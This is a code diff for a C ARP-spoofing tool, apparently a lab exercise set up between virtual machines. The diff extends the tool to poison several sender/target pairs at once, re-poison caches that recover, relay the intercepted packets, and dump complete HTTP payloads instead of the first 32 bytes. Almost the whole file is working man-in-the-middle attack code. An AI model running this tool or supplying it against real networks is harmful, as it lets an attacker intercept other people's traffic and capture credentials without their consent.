@@ -1,3 +1,7 @@
+/* attacker : VM guest Ubuntu
+   sender : VM host MacOS
+*/
+
 #include <pcap.h>
 #include <stdio.h>
 #include <stdint.h>
@@ -44,7 +48,7 @@ void dump_data(uint8_t* p, int32_t len){
 	for(uint32_t i=0; i< len; i++){
 		printf("%02x ", *p);
 		p++;
-		if((i&0x0f) == 0x0f)
+		if((i&0x0f) == 0x0f && i != len-1)
 			printf("\n");
 	}
 }
@@ -56,13 +60,14 @@ void print_mac(uint8_t * p){
 void print_packet(uint8_t * p){
 	struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr *) p;
 	if(ntohs(eth_h -> ether_type) != ETHERTYPE_IP) return;
-
 	struct libnet_ipv4_hdr * ip_h = (struct libnet_ipv4_hdr*)(eth_h+1);
 	if(ip_h->ip_p != IPPROTO_TCP) return;
-
 	struct libnet_tcp_hdr * tcp_h = (struct libnet_tcp_hdr*)((uint8_t*)ip_h + ip_h->ip_hl*4);
+	if(ntohs(tcp_h -> th_sport) != 80 && ntohs(tcp_h -> th_dport) != 80) return;
+
 	uint8_t * data = (uint8_t*)tcp_h + tcp_h->th_off*4;
 	int data_len = ntohs(ip_h->ip_len) - ip_h->ip_hl*4 - tcp_h->th_off*4;
+	if(data_len == 0) return;
 
 	printf("------------------------------------------------\n");
 	printf("[MAC src] : ");print_mac(eth_h->ether_shost);
@@ -72,8 +77,8 @@ void print_packet(uint8_t * p){
 	printf("[Port src] : %hu\n", ntohs(tcp_h->th_sport));
 	printf("[Port dst] : %hu\n", ntohs(tcp_h->th_dport));
 	printf("[Data] : ");
-	dump_data(data, min<int>(data_len,32));
-	printf("------------------------------------------------\n\n\n");
+	dump_data(data, data_len);
+	printf("\n------------------------------------------------\n\n\n");
 }
 
 bool send_arp(pcap_t * handle, uint16_t op, uint8_t* eth_src, uint8_t* eth_dst, uint8_t* arp_sha, uint8_t* arp_sip, uint8_t* arp_tha, uint8_t* arp_tip){	
@@ -196,9 +201,9 @@ int main(int argc, char * argv[]){
 	char * dev = argv[1];
 	uint8_t brdcst_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
 	uint8_t zero_mac[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
-	uint8_t my_mac[6], sender_mac[MAX_SESS_NUM][6], target_mac[SESSION_NUM][6];
-	uint8_t my_ip[4], sender_ip[MAX_SESS_NUM][4], target_ip[SESSION_NUM][4];
-	int s_num  = (argc-2)/2
+	uint8_t my_mac[6], sender_mac[MAX_SESS_NUM][6], target_mac[MAX_SESS_NUM][6];
+	uint8_t my_ip[4], sender_ip[MAX_SESS_NUM][4], target_ip[MAX_SESS_NUM][4];
+	int session  = (argc-2)/2;
 	
 	pcap_t * handle = pcap_open_live(dev,BUFSIZ,1,1,errbuf);
 	if (handle == NULL) {
@@ -206,20 +211,19 @@ int main(int argc, char * argv[]){
 		return -1;
 	}
 
-	inet_pton(AF_INET, argv[2], sender_ip);
-	inet_pton(AF_INET, argv[3], target_ip);
-
 	/* get all addresses */
 	get_my_addr(dev, my_mac, my_ip);
 	
-	for (int n=0; n < s_num; n++){
-	inet_pton(AF_INET, argv[2], sender_ip[n])
-	send_arp(handle, ARPOP_REQUEST, my_mac, brdcst_mac, my_mac, my_ip, zero_mac, sender_ip);
-	get_mac(handle, sender_mac);
-	send_arp(handle, ARPOP_REQUEST, my_mac, brdcst_mac, my_mac, my_ip, zero_mac, target_ip);
-	get_mac(handle, target_mac);
-
-	send_arp(handle, ARPOP_REPLY, my_mac, sender_mac, my_mac, target_ip, sender_mac, sender_ip);
+	for (int n=0; n<session; n++){
+		inet_pton(AF_INET, argv[2*n+2], sender_ip[n]);
+		inet_pton(AF_INET, argv[2*n+3], target_ip[n]);
+		send_arp(handle, ARPOP_REQUEST, my_mac, brdcst_mac, my_mac, my_ip, zero_mac, sender_ip[n]);
+		get_mac(handle, sender_mac[n]);
+		send_arp(handle, ARPOP_REQUEST, my_mac, brdcst_mac, my_mac, my_ip, zero_mac, target_ip[n]);
+		get_mac(handle, target_mac[n]);
+	}
+	for (int n=0; n<session; n++)
+		send_arp(handle, ARPOP_REPLY, my_mac, sender_mac[n], my_mac, target_ip[n], sender_mac[n], sender_ip[n]);
 
 	while (true) {
 		struct pcap_pkthdr* header;
@@ -227,19 +231,15 @@ int main(int argc, char * argv[]){
 		int res = pcap_next_ex(handle, &header, &packet);
 		if (res == 0) continue;
 		if (res == -1 || res == -2) break;
-
-		/*send_arp(handle, ARPOP_REPLY, my_mac, sender_mac, my_mac, target_ip, sender_mac, sender_ip);
-		sleep(0.1);
-		*/
-
-		if(recovered((uint8_t*)packet, sender_mac, target_mac))
-			send_arp(handle, ARPOP_REPLY, my_mac, sender_mac, my_mac, target_ip, sender_mac, sender_ip);
-		
-		if(spoofed((uint8_t*)packet, sender_mac)){
-			relay(handle, (uint8_t*)packet, header->caplen, my_mac, target_mac);
-			print_packet((uint8_t*)packet);
+		for (int n=0; n < session; n++){
+			if(recovered((uint8_t*)packet, sender_mac[n], target_mac[n]))
+				send_arp(handle, ARPOP_REPLY, my_mac, sender_mac[n], my_mac, target_ip[n], sender_mac[n], sender_ip[n]);
+			
+			if(spoofed((uint8_t*)packet, sender_mac[n])){
+				relay(handle, (uint8_t*)packet, header->caplen, my_mac, target_mac[n]);
+				print_packet((uint8_t*)packet);
+			}
 		}
-		
 	}
 	pcap_close(handle);
 	return 0;
